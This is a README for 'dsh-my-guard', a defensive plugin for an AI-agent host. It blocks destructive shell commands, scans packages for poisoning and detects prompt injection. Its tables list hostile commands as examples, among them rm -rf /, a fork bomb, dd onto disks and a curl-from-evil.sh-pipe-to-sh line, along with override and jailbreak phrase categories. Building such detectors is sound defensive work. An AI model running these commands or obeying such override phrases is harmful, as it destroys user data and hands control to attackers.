# dsh-my-guard

[![插件生态](https://img.shields.io/badge/插件生态-topic%20dsh-4d6bfe)](https://github.com/topics/dsh)

<div align="center">
  <img alt="安全护栏面板：告警列表（提示注入命中 + 确认按钮）+ 投毒扫描结果（可疑脚本/私钥）" src="https://unpkg.com/dsh-my-guard/assets/guard-panel.png" width="640" />
  <br/>
  <img alt="自定义护栏规则 + 告警通知（issue #88）：规则编辑（正则/模式/严重级）+ 规则测试（合并决策）+ dsh-my-notify 通知开关" src="https://unpkg.com/dsh-my-guard/assets/guard-rules-panel.png" width="640" />
</div>

**DSH 安全护栏插件**：**执行前护栏**在破坏性命令（`rm -rf /` 等）执行前拦截/确认；**安装前投毒扫描**在 `dsh plugin add` 时扫描包内容（可疑脚本 / 密钥 / 恶意依赖）并告警；**提示注入检测**用规则 + 启发式检测 prompt injection / jailbreak 尝试。

## 功能

### 1. 执行前护栏（破坏性命令拦截/确认）

Server 端监听 `tools/pre-execute`，bash 命令匹配破坏性模式时记录 high 告警：

| 模式          | 示例                                                 |
| ------------- | ---------------------------------------------------- |
| 删除根/家目录 | `rm -rf /`、`rm -fr /*`、`rm -rf ~`、`rm -rf $HOME`  |
| 格式化磁盘    | `mkfs.ext4 /dev/sdb1`                                |
| 直接写块设备  | `dd if=/dev/zero of=/dev/sda`、`> /dev/sda`          |
| fork 炸弹     | `:(){ :                                              | :& };:` |
| 根目录全权限  | `chmod -R 777 /`、`chown -R`                         |
| 关机/重启     | `shutdown`、`reboot`、`halt`、`poweroff`             |
| 下载执行      | `curl http://evil.sh \| sh`、`wget -qO- ... \| bash` |

三种护栏模式（插件配置 `mode`）：

| 模式              | 行为                                                               |
| ----------------- | ------------------------------------------------------------------ |
| `observe`（默认） | 只读观察：记录告警，工具照常执行（不改变工具/审批流程）            |
| `ask`             | 返回 `{ kind: 'ask' }` 触发 DSH 原生审批流程，**用户确认后才执行** |
| `deny`            | 直接拦截（工具返回错误）                                           |

### 2. 安装前投毒扫描（可疑内容告警）

检测到 bash 命令 `dsh plugin add <pkg>` 时**自动扫描包内容**（异步，不阻塞工具流程）：

- `link:<路径>` / 本地路径 → 直接扫描目录；
- 包名 → 经 npm registry 下载 tarball 后扫描（**绝不执行包内代码**）。

扫描检测项：

| 类别     | 检测内容                                                                                                                                       |
| -------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| 可疑脚本 | install/postinstall 脚本含下载执行、eval、base64 解码、chmod +x、curl POST、node -e / python -c、git clone、再装依赖、写 /etc / crontab / .ssh |
| 密钥     | 私钥（RSA/EC/OpenSSH）、AWS Access Key、GitHub PAT、OpenAI Key、Slack Token、Google API Key、硬编码凭据                                        |
| 恶意依赖 | 已知被投毒/恶意包名（flatmap-stream、event-stream 等 npm 投毒历史事件）                                                                        |
| 可疑文件 | .exe/.dll/.bin/.so/.jar 二进制、.sh/.bash 脚本、.bat/.cmd/.ps1                                                                                 |

发现可疑内容 → 记录 poison 告警（含文件 + 模式）。也可在侧边栏面板或 `POST /guard/api/scan` 手动扫描任意包名/路径。

### 3. 提示注入检测（命中告警）

规则 + 启发式检测用户消息中的 prompt injection / jailbreak 尝试：

| 规则                   | 严重级别 | 检测内容                                 |
| ---------------------- | -------- | ---------------------------------------- |
| `ignore-previous`      | high     | 忽略之前/以上所有指令（中英文）          |
| `system-override`      | high     | 系统提示词覆盖（你是系统/管理员/root）   |
| `jailbreak`            | high     | DAN / jailbreak / 越狱 / do anything now |
| `role-escalation`      | medium   | 扮演/假装 + root/管理员/无限制           |
| `secret-exfil`         | high     | 发送/上传密钥、密码、/etc/passwd 到外部  |
| `encoding-obfuscation` | medium   | base64/rot13/hex 解码执行指令            |
| `disable-safety`       | high     | 关闭/禁用/绕过安全审查机制               |

监听 `session/event` 的 `user/message`（过滤插件注入消息，避免误报）自动检测，命中 → 记录 injection 告警；也可在面板或 `POST /guard/api/scan-prompt` 手动检测。

### 4. 自定义护栏规则（自定义 bash 危险模式）

用户可添加**自定义 bash 危险模式（正则）**，与内置破坏性命令规则**合并生效**（issue #88）：

- 每条自定义规则含：`pattern`（正则）、`mode`（observe / ask / deny）、`severity`（low / medium / high）、`description`（可选）；
- **合并语义**：命中取最严格模式（deny > ask > observe）、最严重级（high > medium > low）；自定义规则**只升不降**——内置 deny 不会被自定义 observe 降级，自定义 deny 可在全局 observe 上升级拦截；
- 配置持久化到 profile patch（`customRules` 以 JSON 字符串写入 `id: guard` 行的 `config`），**设置页可视化编辑**：侧边栏「安全护栏」页签底部的「自定义护栏规则」区可增删改规则并保存；
- 面板「规则测试」输入命令 → 实时预览命中哪些规则（内置/自定义）+ 合并决策。

### 5. 高严重级告警通知（可选集成）

高严重级告警（deny 拦截 / 密钥泄露 / 提示注入 high 等）经 **dsh-my-notify** 触发接口 `POST /notify/api/trigger` 推送通知（可选集成）：

- 配置 `notifyEnabled: true` 开启（默认关闭）；
- 同类型告警**冷却**（`notifyCooldownMs`，默认 60000ms）防刷屏；
- 通知异步 fire-and-forget，失败静默，不阻塞告警记录。

### 6. 告警记录 + 用户确认机制

- 三类告警（破坏性命令 / 投毒扫描 / 提示注入）统一记录，持久化 `$DSH_HOME/guard/alerts.json`（防抖 + 原子写），**重启后恢复**；
- 上限 500 条（FIFO 淘汰）防膨胀；
- 侧边栏「安全护栏」面板：告警列表（类型徽标 + 严重度 + 时间 + 消息 + 详情），每条可点「确认」标记已确认（用户确认机制）。

## 工作原理

- **Server 端**（`lib/index.js`）：`guard.js` 监听 `tools/pre-execute`（破坏性检测 + `dsh plugin add` 联动扫描）；`poison.js` 纯函数扫描引擎（目录/tarball/包名）；`injection.js` 监听 `session/event`（user/message 注入检测）；`store.js` 告警持久化；`routes.js` 提供 `/guard/api` 路由（全部经 loopback 信任围栏）。
- **Client 端**（`lib/client.js`）：侧边栏页签 `dsh-my-guard:guard`（告警列表 + 扫描工具 + 注入检测工具），经**宿主原生侧边栏扩展点**注册（`ctx.sidebarRightTabs` 页签类型 + `slots` 的 `sidebar.right.pane.tab` / `.title` 席位，issue #187 批 1），样式走 DSH 语义 token，随 fiber 卸载无残留。

## 安装

> 💡 **npm 安装（普通用户推荐）**：`dsh plugin --profile web add dsh-my-guard --trust-lockfile`——无需克隆本仓库；以下 link 方式供本仓库开发者使用。

```bash
# 1) 克隆本仓库（任意目录）
git clone https://github.com/baosfeng/my-dsh-plugins.git
# 2) 以本地 link 方式安装（将 <仓库路径> 替换为上面的克隆目录）
dsh plugin --profile web add link:<仓库路径>/plugins/dsh-my-guard
```

- server 端改动需重启 `dsh web`；client 端改动浏览器硬刷新（Cmd/Ctrl+Shift+R）即可。

## 配置

插件级配置（`cordis.patch.yml` 对应插件行的 `config` 字段，均为可选）：

```yaml
- insert:
    - id: guard
      name: 'dsh-my-guard'
    - config: # 传给 apply(ctx, config)
        mode: 'observe' # 护栏模式：observe（默认，只告警）/ ask（审批确认）/ deny（直接拦截）
        poisonScan: true # 投毒扫描自动联动（默认 true）
        injection: true # 提示注入检测（默认 true）
        notifyEnabled: false # 高严重级告警经 dsh-my-notify 推送（默认关闭，issue #88）
        notifyCooldownMs: 60000 # 同类型告警通知冷却（ms，默认 60000）
        # customRules: '[{"pattern":"touch /etc/evil","mode":"deny","severity":"high","description":"写 /etc"}]'
        #   ↑ 自定义护栏规则（JSON 字符串；设置页保存后自动写入，无需手动编辑）
```

## 依赖

| 依赖     | 用途          | 可选           |
| -------- | ------------- | -------------- |
| `cordis` | 插件运行时    | 是（宿主提供） |
| `react`  | client 端组件 | 是（宿主提供） |

## 限制与说明

- **observe 模式不拦截**：默认只记录告警，工具照常执行；需要真正拦截/确认请配置 `mode: 'ask'` 或 `mode: 'deny'`。
- **投毒扫描只读**：扫描绝不执行包内脚本/代码；tarball 经 tar 解压到临时目录后扫描，扫描完清理。
- **注入检测过滤插件消息**：`source.kind === 'plugin'` 的注入消息（runtime-context 快照等）不检测，避免误报。
- **告警上限**：500 条，超出自动淘汰最旧告警。

## 相关文档

→ [安全护栏模块文档](../../docs/安全护栏/概述.md) · [需求清单](../../docs/安全护栏/需求清单.md) · [CHANGELOG](CHANGELOG.md)
